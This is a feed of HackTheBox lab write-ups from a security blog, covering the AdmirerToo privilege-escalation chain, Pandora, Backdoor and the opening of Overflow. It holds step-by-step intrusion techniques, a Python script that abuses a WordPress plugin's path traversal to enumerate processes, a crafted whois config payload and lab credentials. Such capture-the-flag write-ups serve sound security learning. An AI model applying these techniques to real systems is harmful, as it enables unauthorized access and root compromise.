<p>Since I now have access to the box over SSH, I can use it to setup tunnels to those local ports, and hopefully identify them using <code class="language-plaintext highlighter-rouge">nmap</code>. After setting up the tunnels, I performed a version scan on the ports;</p>

<p><img src="/assets/img/20220215101505.png" alt="" /></p>

<p>The service on port <strong>8080</strong> was now identified as <em>Apache httpd 2.4.38 ((Debian))</em>. Opening it up in my browser, I got a login page;</p>

<p><img src="/assets/img/20220215101822.png" alt="" /></p>

<p>Testing the credentials I have up to this point for an easy win, I was able to login using the username <code class="language-plaintext highlighter-rouge">jennifer</code> and password <code class="language-plaintext highlighter-rouge">bQ3u7^AxzcB7qAsxE3</code>;</p>

<p><img src="/assets/img/20220215102211.png" alt="" /></p>

<p>The footer showed the version of <strong>OpenCATS</strong> running is <strong>0.9.5.2</strong>. Notice that <em>jennifer</em> has read-only access to the service</p>

<p><br /></p>

<h4 id="opencats">OpenCATS</h4>
<p><br /></p>

<p>With the version of <strong>OpenCATS</strong> now known, I started looking for exploits. The article https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html showed that the service is vulnerable to <em>arbitrary file write</em> due to unsafe PHP object deserialization.</p>

<blockquote>
  <p>OpenCATS is vulnerable to PHP Object injection, by leveraging this vulnerability, it is possible to conduct arbitrary file write and execute arbitrary code on a system.</p>
</blockquote>

<p>The request of interest is triggered after hitting any of the below links;</p>

<p><img src="/assets/img/20220215110734.png" alt="" /></p>

<p>This generate a GET request with the parameter <code class="language-plaintext highlighter-rouge">parametersactivity:ActivityDataGrid</code> containing the serialized PHP object;</p>

<p><img src="/assets/img/20220215114134.png" alt="" /></p>

<p>Following the article, I tried to write a file to the root of the web app at <code class="language-plaintext highlighter-rouge">/opt/opencats</code>, but got a <strong>500</strong> error response. This is probably because of permission issues as the web root is owned by the root user.</p>

<p>So I tried to create a file in the globally writable directory <code class="language-plaintext highlighter-rouge">/dev/shm</code>, and it worked;</p>

<p><img src="/assets/img/20220215161307.png" alt="" /></p>

<p><img src="/assets/img/20220215161455.png" alt="" /></p>

<p><img src="/assets/img/20220215161532.png" alt="" /></p>

<p>The file is created as the user <strong>devel</strong>. The user <strong>devel</strong> does not have a login shell, and his home directory does not exist;</p>

<p><img src="/assets/img/20220215161640.png" alt="" /></p>

<p>So I begin to search the filesystem for files and directories this user owns, and found a few;</p>

<p><img src="/assets/img/20220215114845.png" alt="" /></p>

<p><strong>devel</strong> has write permissions on two key directories;</p>

<p><img src="/assets/img/20220215161814.png" alt="" /></p>

<p>Both directories are empty. The directory <code class="language-plaintext highlighter-rouge">/usr/local/etc</code> is used by some programs to store and load configuration files. So I started looking for any program I could exploit using this. Listing running services using <code class="language-plaintext highlighter-rouge">systemctl</code> showed that <em>Fail2Ban</em>, which is an IPS-like service that blocks suspicious IPs, is running on the host;</p>

<p><img src="/assets/img/20220215170016.png" alt="" /></p>

<p>Searching for known expoits for this service, I found an article explaining how it could be exploited at https://research.securitum.com/fail2ban-remote-code-execution/</p>

<p>The article explains how data passed to the <code class="language-plaintext highlighter-rouge">mail</code> command without validation can lead to <em>arbitrary code execution</em> using the <code class="language-plaintext highlighter-rouge">~!</code> escape sequence. I was able to test this locally, and it worked. A shell command was executed in my default login shell;</p>

<p><img src="/assets/img/20220215170817.png" alt="" /></p>

<p>Reading further into the article, this paragraph was particularly interesting;</p>

<p><img src="/assets/img/20220215171014.png" alt="" /></p>

<p>When <em>Fail2Ban</em> bans an IP, it sends an email notification to a defined address. The email will contain the result of a <em>whois</em> lookup for the IP address. So if I could control this, I could add a command that will be executed in the result of the whois lookup.</p>

<p>Testing this with a user account that does not have a default shell didn’t work;</p>

<p><img src="/assets/img/20220215172244.png" alt="" /></p>

<p>Changing the escape from <code class="language-plaintext highlighter-rouge">~!</code> to <code class="language-plaintext highlighter-rouge">~|</code> did the trick;</p>

<p><img src="/assets/img/20220215172357.png" alt="" /></p>

<p>Now all I needed to do is create a <em>whois</em> config that will direct all whois lookups to my machine on port <strong>43</strong>. To do this, I need to create a configuration file at <code class="language-plaintext highlighter-rouge">/usr/local/etc/whois.conf</code> that will be used by <code class="language-plaintext highlighter-rouge">whois</code>. I can use the deserialization exploit to do this, but the problem is other data is added to my payload;</p>

<p><img src="/assets/img/20220215173720.png" alt="" /></p>

<p>Note that only the highlighted text is my actual payload. After studying a bit on whois configuration files, I learned that the configurations have to be in <em>regular expression</em>. After lots of trials and errors, I was able to craft a valid <em>whois</em> config file to match my IP address using the payload <code class="language-plaintext highlighter-rouge">"}]|10.10.16.53 [10.10.16.53]</code>;</p>

<p><img src="/assets/img/20220215181115.png" alt="" /></p>

<p>As you can see above, I was able to get <code class="language-plaintext highlighter-rouge">whois</code> to query my own server. Now I have all I need to execute commands on the box.</p>

<p>With the whois configuration file in place, I started a netcat listener on port <strong>43</strong> to send the payload as a whois response;</p>

<p><img src="/assets/img/20220215183213.png" alt="" /></p>

<p>Then I started another listener on port <strong>443</strong> to receive the above reverse shell. Now to trigger the exploit, I need to make <em>Fail2Ban</em>, which is running as root, to ban my IP. This will result in a whois request that will be replied to with my payload. To trigger this ban, I bruteforced the SSH login using <code class="language-plaintext highlighter-rouge">hydra</code>, which made <em>Fail2Ban</em> ban my IP. This resulted in a whois lookup to my box;</p>

<p><img src="/assets/img/20220215183555.png" alt="" /></p>

<p>The request hangs however, and I had to press <code class="language-plaintext highlighter-rouge">CTRL + C</code> to exit. After closing the fake whois server, my payload was executed, and I got a shell in the box as root;</p>

<p><img src="/assets/img/20220215183848.png" alt="" /></p>

<p>This is the <em>hard</em> box I managed to solve, and even though it took some nudges, I was very happy!!!</p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Discovered port <strong>22</strong>, <strong>80</strong>, and <strong>4242</strong> (filtered) with <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Found a subdomain <code class="language-plaintext highlighter-rouge">db.admirer-galley.htb</code>  running an instance of <em>Adminer</em>.</li>
  <li>Exploited an <em>SSRF</em> flaw in <em>Adminer</em> to access the service on port <strong>4242</strong>.</li>
  <li>Service on port <strong>4242</strong> (OpenTSDB) was found to be vulnerable to <strong>RCE</strong>, which gave me access to the box as the local user <strong>opentsdb</strong>.</li>
  <li>Inside as <strong>opentsdb</strong>
    <ul>
      <li>Recovered a password in the configuration file of the one-click login plugin used by Adminer.</li>
      <li>Gained access to the account of <strong>jennifer</strong> due to password reuse.</li>
    </ul>
  </li>
  <li>Inside as <strong>jennifer</strong>
    <ul>
      <li>Setup a tunnel to an instance of <em>OpenCATS</em> running locally on port <strong>8080</strong>, and logged in as <strong>jennifer</strong>.</li>
      <li>Exploited a PHP deserialization flaw to create files on the server as the user <strong>devel</strong>.</li>
      <li><strong>devel</strong> has write access to <code class="language-plaintext highlighter-rouge">/usr/local/etc</code>, which I exploited to create <code class="language-plaintext highlighter-rouge">whois</code> config that queries my server.</li>
      <li>Exploited the way <em>Fail2Ban</em> is calling <code class="language-plaintext highlighter-rouge">mail</code> with the output of whois lookups to gain code execution as <strong>root</strong>.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="adminer" /><category term="mysql" /><category term="php" /><category term="ssrf" /><category term="opentsdb" /><category term="rce" /><category term="opencats" /><category term="fail2ban" /><category term="whois" /><category term="object injection" /><category term="insecure deserialization" /><category term="phpggc" /><summary type="html"><![CDATA[AdmirerToo is a hard-rated linux box. It starts with an SSRF exploit on Adminer to access an instance of OpenTSDB on port 4242, which is vulnerable to RCE. This will give you a shell on the box as opentsdb, which you can use to extract credentials from a configuration file and gain access to the account of jennifer due to password reuse. An instance of OpenCATS is running locally on port 8080, which you can access by setting up an SSH tunnel. OpenCATS is running as the user devel, who has write permissions on the directory /usr/local/etc, and is vulnerable object injection that you can use to write files in the directory, and exploit the Fail2Ban service to gain code execution as root.]]></summary></entry><entry><title type="html">Pandora - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/pandora.html" rel="alternate" type="text/html" title="Pandora - HackTheBox" /><published>2022-05-21T00:00:00+01:00</published><updated>2022-05-21T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/pandora</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/pandora.html"><![CDATA[<p><strong>Pandora</strong> is an easy linux box. It starts with a website, which you don’t really need because foothold involves enumerating an SNMP service on port <strong>161</strong> (UDP) for running processes, which will give you the credentials of a local user. This will give you SSH access to the box, which you will use to setup a tunnel to an apache vhost that’s accessible only locally. This site is vulnerable to LFI ( I later found out this is unintended, and never got around to actually doing the box the intended way :p ) which you can use to move to another local user, and from there exploit a custom SUID binary through <em>path tampering</em> to gain code execution as root.</p>

<p><br /></p>

<h3 id="about">About</h3>
<p><br /></p>

<p><img src="/assets/img/20220208055528.png" alt="" /></p>

<p><img src="/assets/img/20220208055557.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Fri Jan 28 14:55:17 2022 as: nmap -sS -sV -v -oN nmap.txt 10.10.11.136
Nmap scan report for pandora.htb (10.10.11.136)
Host is up (0.29s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 28 14:59:09 2022 -- 1 IP address (1 host up) scanned in 232.39 seconds
</code></pre>

<p><br /></p>

<h4 id="web">Web</h4>

<p><img src="/assets/img/20220208060055.png" alt="" /></p>

<p>The site has a contact-us form that does generate a request, but the response, which just returns the homepage of the site, does not change no matter what I did to the parameters;</p>

<p><img src="/assets/img/20220208060341.png" alt="" /></p>

<p>Bruteforcing the web root for hidden files, and also for hidden subdomains didn’t give me anything of use. A quick UDP port scan with NMAP showed port <strong>161</strong> (SNMP) is open. So I scanned it deeper with <code class="language-plaintext highlighter-rouge">-sU -sC -sV</code> flags, and found a credential <code class="language-plaintext highlighter-rouge">daniel</code>:<code class="language-plaintext highlighter-rouge">HotelBabylon23</code> that is being passed to a script as command line argument;</p>

<p><img src="/assets/img/20220208061826.png" alt="" /></p>

<p>The script that did this enumeration is <code class="language-plaintext highlighter-rouge">snmp-processes</code>, which is used to discover running processes on a host running SNMP. Using the credential, I was able to get access to the box over SSH;</p>

<p><img src="/assets/img/20220208062306.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="user">User</h3>
<p><br /></p>

<h4 id="pandorapandahtb">pandora.panda.htb</h4>

<p>After poking around a little inside the box, the apache configuration file at <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-available/pandora.conf</code> showed a hidden subdomain;</p>

<p><img src="/assets/img/20220208063020.png" alt="" /></p>

<p>I added the hostname to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file, but was unable to access it as on request the server simply returns that static web page at <code class="language-plaintext highlighter-rouge">pandora.htb/</code>. Notice in the first line of the Apache2 config that the hostname for the virtual host is <strong>localhost</strong>. This means the domain is accessible only locally. So with my SSH access into the box, I setup an SSH tunnel so I can access the site over port <strong>8888</strong> on my attack host;</p>

<p><img src="/assets/img/20220209212210.png" alt="" /></p>

<p>Then I updated my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file;</p>

<p><img src="/assets/img/20220209212316.png" alt="" /></p>

<p>And it worked;</p>

<p><img src="/assets/img/20220209212416.png" alt="" /></p>

<p>I couldn’t read the <code class="language-plaintext highlighter-rouge">include/config.php</code> file as it is owned by <strong>matt</strong> and the permissions were locked down.</p>

<p>A search in <code class="language-plaintext highlighter-rouge">searchsploit</code> for exploits targeting this service gave a bunch of results;</p>

<p><img src="/assets/img/20220208064507.png" alt="" /></p>

<p>Testing the credentials of <strong>daniel</strong>, I was able to get a different response that indicates a valid credential, with possibly restricted permissions;</p>

<p><img src="/assets/img/20220208064935.png" alt="" /></p>

<p>I have no idea what this API is, so I went back into the box as <strong>daniel</strong>, and start going through the source code of the web app. Inside the <code class="language-plaintext highlighter-rouge">include/</code> folder, I found a file named <code class="language-plaintext highlighter-rouge">api.php</code>, which likely contains the implementation of the API I have access to.</p>

<p>Sending a request to the URL at <code class="language-plaintext highlighter-rouge">/include/api.php</code> gave me this;</p>

<p><img src="/assets/img/20220208130155.png" alt="" /></p>

<p>So I started poking around at the source code of the API to figure out how it works. It accepts username and password through the GET parameters <code class="language-plaintext highlighter-rouge">user</code> and <code class="language-plaintext highlighter-rouge">pass</code> respectively. Supplying the creds of <strong>daniel</strong> gave me a different output;</p>

<p><img src="/assets/img/20220208130355.png" alt="" /></p>

<p>Reviewing the source code even more, I realized it expects to be told the task to perform using the parameter <code class="language-plaintext highlighter-rouge">op</code>;</p>

<p><img src="/assets/img/20220208130613.png" alt="" /></p>

<p>The above gave us three valid values for the <code class="language-plaintext highlighter-rouge">op</code> parameter, which are <code class="language-plaintext highlighter-rouge">get</code>, <code class="language-plaintext highlighter-rouge">set</code>, and <code class="language-plaintext highlighter-rouge">help</code>. Looking further into the source code revealed something nice;</p>

<p><img src="/assets/img/20220208130832.png" alt="" /></p>

<p>If I can control the value assigned to the variable <code class="language-plaintext highlighter-rouge">$ext_name</code>, I can control the file that will be included, which I could exploit to load PHP files for <em>arbitrary code execution</em>. Turns out I can, because <code class="language-plaintext highlighter-rouge">$ext_name</code> is assigned the value of a GET parameter;</p>

<p><img src="/assets/img/20220208131814.png" alt="" /></p>

<p>So I logged back into the box and into <code class="language-plaintext highlighter-rouge">/dev/shm/.0</code> directory, and created a PHP script named <code class="language-plaintext highlighter-rouge">.api.php</code> containing my reverse shell;</p>

<p><img src="/assets/img/20220209213324.png" alt="" /></p>

<p>I then have the web app execute the script using the request;</p>

<p><img src="/assets/img/20220209213432.png" alt="" /></p>

<p>Sending this, I got a shell as the user <strong>matt</strong>;</p>

<p><img src="/assets/img/20220209213723.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>The user <strong>matt</strong> does not have sudo permissions on any file in the box. Searching for SUID binaries gave an interesting result;</p>

<p><img src="/assets/img/20220209214320.png" alt="" /></p>

<p>It’s a binary file, so I shipped it over to my attack host and opened it in <code class="language-plaintext highlighter-rouge">radare2</code>. Dumping strings contained in the binary revealed a possible command that could be vulnerable to <em>path tampering</em>;</p>

<p><img src="/assets/img/20220209214759.png" alt="" /></p>

<p>I checked if it’s indeed used as a command by listing all references to it using the command <code class="language-plaintext highlighter-rouge">axt @ &lt;address&gt;</code>. I got one match in the <code class="language-plaintext highlighter-rouge">main()</code> function;</p>

<p><img src="/assets/img/20220209215056.png" alt="" /></p>

<p>Using my shell on the box as <strong>matt</strong>, I moved to a writeable directory, created a file named <code class="language-plaintext highlighter-rouge">tar</code> containing a reverse shell, made it executable, added it to the <code class="language-plaintext highlighter-rouge">$PATH</code> variable, and called the <code class="language-plaintext highlighter-rouge">pandora_backup</code> script. This gave me root access to the box;</p>

<p><img src="/assets/img/20220209222448.png" alt="" /></p>

<p><img src="/assets/img/20220209222501.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified port <strong>22</strong> and <strong>80</strong>.</li>
  <li>UDP port scan revealed port <strong>161</strong> (SNMP) is open.</li>
  <li>NMAP’s <code class="language-plaintext highlighter-rouge">snmp-process</code> revealed a password for a user named <strong>daniel</strong>, which gave access to the box over SSH.</li>
  <li>Inside as <strong>daniel</strong>
    <ul>
      <li>Found a vhost configured with apache that is accessible only locally.</li>
      <li>Setup a tunnel through SSH to access the site from my box.</li>
      <li>Found a vulnerable API that can be exploited for <em>code execution</em> as the user <strong>matt</strong>.</li>
    </ul>
  </li>
  <li>Inside as <strong>matt</strong>
    <ul>
      <li>Found a custom SUID script.</li>
      <li>Basic analysis with <code class="language-plaintext highlighter-rouge">radare2</code> showed it’s vulnerable to <em>path tampering</em>.</li>
      <li>Exploited it to gain code execution as <em>root</em>.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="snmp" /><category term="vhost" /><category term="apache" /><category term="php" /><category term="static analysis" /><category term="lfi" /><category term="suid" /><category term="reverse engineering" /><category term="path tampering" /><category term="radare2" /><summary type="html"><![CDATA[Pandora is an easy linux box. It starts with a website, which you don’t really need because foothold involves enumerating an SNMP service on port 161 (UDP) for running processes, which will give you the credentials of a local user. This will give you SSH access to the box, which you will use to setup a tunnel to an apache vhost that’s accessible only locally. This site is vulnerable to LFI ( I later found out this is unintended, and never got around to actually doing the box the intended way :p ) which you can use to move to another local user, and from there exploit a custom SUID binary through path tampering to gain code execution as root.]]></summary></entry><entry><title type="html">Backdoor - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/backdoor.html" rel="alternate" type="text/html" title="Backdoor - HackTheBox" /><published>2022-04-23T00:00:00+01:00</published><updated>2022-04-23T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/backdoor</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/backdoor.html"><![CDATA[<p><strong>Backdoor</strong> is a very easy linux box on <em>HackTheBox</em>. It starts with a web service running <em>wordpress</em> with a plugin that’s vulnerable to <em>path traversal</em>, which you can use to read arbitrary files on the box. You then use this bug to identify a service running on the box on port <strong>1337</strong>, which you can exploit to gain a foothold on the box as the local user. Privesc is stupidly easy, and targets a <em>screen</em> session running on the box as root.</p>

<p><br /></p>

<h3 id="about">About</h3>
<p><br /></p>

<p><img src="/assets/img/20220421094330.png" alt="" /></p>

<p><img src="/assets/img/20220421094356.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Sat Nov 20 20:00:32 2021 as: nmap -sC -sV -oN nmap.txt -v backdoor.htb
Nmap scan report for backdoor.htb (10.10.11.125)
Host is up (0.28s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &amp;#8211; Real-Life
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 20 20:01:23 2021 -- 1 IP address (1 host up) scanned in 51.47 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>

<p><em>Wappalyzer</em> identified it as a wordpress site;</p>

<p><img src="/assets/img/20220421094748.png" alt="" /></p>

<p>Oddly, the default wordpress plugins directory on the site shows the index of the directory, saving us the need to enumerate plugins;</p>

<p><img src="/assets/img/20220421095240.png" alt="" /></p>

<p>A search on <em>exploitdb</em> using <code class="language-plaintext highlighter-rouge">searchsploit</code> showed this plugin has a vulnerability;</p>

<p><img src="/assets/img/20220421095544.png" alt="" /></p>

<p><img src="/assets/img/20220421095623.png" alt="" /></p>

<p>Using the PoC, I was able to view the file <code class="language-plaintext highlighter-rouge">/etc/hosts</code> on the box;</p>

<p><img src="/assets/img/20220421100027.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>Using the <em>file traversal</em> bug, a credential was recovered from the wordpress config file <code class="language-plaintext highlighter-rouge">wp-config.php</code>;</p>

<p><img src="/assets/img/20220421100210.png" alt="" /></p>

<p>I was unable to login to the admin dashboard using the credential. Trying the password for the user <strong>user</strong> over SSH also didn’t work;</p>

<p><img src="/assets/img/20220421100541.png" alt="" /></p>

<p>I spent some time working with the <em>file traversal</em> bug, but couldn’t find anything of much interest. A full <code class="language-plaintext highlighter-rouge">nmap</code> scan on the host showed port <strong>1337</strong> is open, but could not be identified;</p>

<p><img src="/assets/img/20220421101609.png" alt="" /></p>

<p>Using the <em>file traversal</em> bug, I wrote a simple program to enumerate running processes by burteforcing <code class="language-plaintext highlighter-rouge">/proc/&lt;pid&gt;/cmdline</code> in hope of finding the process;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#------------------------------------------------------------------------------
#   A program for bruteforcing running processes on Backdoor (HackTheBox) using
# the path traversal bug in a wordpress plugin.
#                                                               Author: 4g3nt47
#------------------------------------------------------------------------------
</span>
<span class="kn">import</span> <span class="nn">queue</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>

<span class="n">abort</span> <span class="o">=</span> <span class="bp">False</span>
<span class="n">threads</span> <span class="o">=</span> <span class="mi">10</span>
<span class="n">pids</span> <span class="o">=</span> <span class="n">queue</span><span class="p">.</span><span class="n">Queue</span><span class="p">()</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1000</span><span class="p">):</span>
  <span class="n">pids</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">brute</span><span class="p">():</span>
  <span class="k">while</span> <span class="n">pids</span><span class="p">.</span><span class="n">empty</span><span class="p">()</span> <span class="o">==</span> <span class="bp">False</span> <span class="ow">and</span> <span class="n">abort</span> <span class="o">!=</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="s">"http"</span><span class="p">:</span><span class="s">"http://localhost:8080"</span><span class="p">}</span>
    <span class="n">pid</span> <span class="o">=</span> <span class="n">pids</span><span class="p">.</span><span class="n">get</span><span class="p">()</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s">"http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/%d/cmdline"</span> <span class="o">%</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
      <span class="n">content</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">).</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
      <span class="n">invalid</span> <span class="o">=</span> <span class="s">"/proc/%d/cmdline"</span> <span class="o">%</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span>
      <span class="n">invalid</span> <span class="o">=</span> <span class="n">invalid</span> <span class="o">+</span> <span class="n">invalid</span> <span class="o">+</span> <span class="n">invalid</span> <span class="o">+</span> <span class="s">"&lt;script&gt;window.close()&lt;/script&gt;"</span>
      <span class="k">if</span> <span class="n">content</span> <span class="ow">and</span> <span class="n">content</span> <span class="o">!=</span> <span class="n">invalid</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"%d : %s"</span> <span class="o">%</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">content</span><span class="p">))</span>
    <span class="k">except</span><span class="p">:</span>
      <span class="k">continue</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">threads</span><span class="p">):</span>
  <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">brute</span><span class="p">)</span>
  <span class="n">t</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>

<span class="k">while</span> <span class="n">pids</span><span class="p">.</span><span class="n">empty</span><span class="p">()</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"[*] PIDs left: %d"</span> <span class="o">%</span><span class="p">(</span><span class="n">pids</span><span class="p">.</span><span class="n">qsize</span><span class="p">()))</span>
  <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
    <span class="n">abort</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="k">break</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<p>Running the program, I found one process that stood out;</p>

<p><img src="/assets/img/20220421102547.png" alt="" /></p>

<p><em>GDB Server</em> is used for remotely debugging programs on a system, which makes it an interesting target for RCE. There is an exploit for this service in <em>metasploit</em>;</p>

<p><img src="/assets/img/20220421103158.png" alt="" /></p>

<p><img src="/assets/img/20220421103612.png" alt="" /></p>

<p>Running the exploit, I got a shell on the box as the user <code class="language-plaintext highlighter-rouge">user</code>;</p>

<p><img src="/assets/img/20220421103755.png" alt="" /></p>

<p>I don’t like working in <em>meterpreter</em> shell, so I switched to a bash reverse shell with tty;</p>

<p><img src="/assets/img/20220421104330.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>The user is not part of any interesting groups, and I can’t view sudo permissions because I do not have their password.</p>

<p>Going through running processes on the box using <code class="language-plaintext highlighter-rouge">ps</code> and <code class="language-plaintext highlighter-rouge">htop</code>, I found something;</p>

<p><img src="/assets/img/20220421104808.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">screen</code> is a terminal multiplexer, and the above command is running it as the root user. If I can attach to this session, I would be able to easily run commands as root. The interesting portion of the command is <code class="language-plaintext highlighter-rouge">screen -dmS root</code>. Going through the help page of <code class="language-plaintext highlighter-rouge">screen</code>, I learned that it basically creates a screen session in detached mode with the name <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p>The <code class="language-plaintext highlighter-rouge">screen</code> program accepts the <code class="language-plaintext highlighter-rouge">-x</code> flag, which can be used to attach to a given session owned by a given user. Using the command <code class="language-plaintext highlighter-rouge">screen -x root/root</code>, I was able to attach to the screen session created by root;</p>

<p><img src="/assets/img/20220421105356.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified port <strong>22</strong> and <strong>80</strong> using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Port <strong>80</strong> is running wordpress with a vulnerable plugin (Path Traversal)</li>
  <li>Full port scan showed port <strong>1337</strong> is open</li>
  <li>Used the <em>path traversal</em> bug to identify the service on port <strong>1337</strong> (gdbserver)
    <ul>
      <li>Used <code class="language-plaintext highlighter-rouge">exploit/multi/gdb/gdb_server_exec</code> in metasploit to gain code execution on the box as the user <strong>user</strong></li>
    </ul>
  </li>
  <li>Inside the box as <strong>user</strong>;
    <ul>
      <li><code class="language-plaintext highlighter-rouge">htop</code> showed a screen session running as the user <strong>root</strong></li>
      <li>Attached to the session using <code class="language-plaintext highlighter-rouge">screen -x root/root</code> to gain a shell as <strong>root</strong></li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="easy" /><category term="web" /><category term="wordpress" /><category term="path traversal" /><category term="lfi" /><category term="cve" /><category term="metasploit" /><category term="gdbserver" /><category term="screen" /><summary type="html"><![CDATA[Backdoor is a very easy linux box on HackTheBox. It starts with a web service running wordpress with a plugin that’s vulnerable to path traversal, which you can use to read arbitrary files on the box. You then use this bug to identify a service running on the box on port 1337, which you can exploit to gain a foothold on the box as the local user. Privesc is stupidly easy, and targets a screen session running on the box as root.]]></summary></entry><entry><title type="html">Overflow - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/overflow.html" rel="alternate" type="text/html" title="Overflow - HackTheBox" /><published>2022-04-09T00:00:00+01:00</published><updated>2022-04-09T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/overflow</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/overflow.html"><![CDATA[<p><strong>Overflow</strong> is an amazing <em>hard</em>-rated box on HackTheBox. To gain a foothold on the box, you will need to exploit an <em>oracle padding</em> vulnerability to gain access to an admin dashboard that’s vulnerable to <em>SQL injection</em>, use the <em>SQL injection</em> to retrieve and crack a hash for another domain, which is vulnerable to an <em>exiftool</em> RCE.</p>

<p>There are two local users on the box; one accessible through password reuse, and the other due to a write privilege on an important system file. For privesc, you will be exploiting a classic <em>buffer overflow</em> on a custom binary with a non-excutable (NX) stack.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20220216103414.png" alt="" /></p>

<p><img src="/assets/img/20220216103523.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

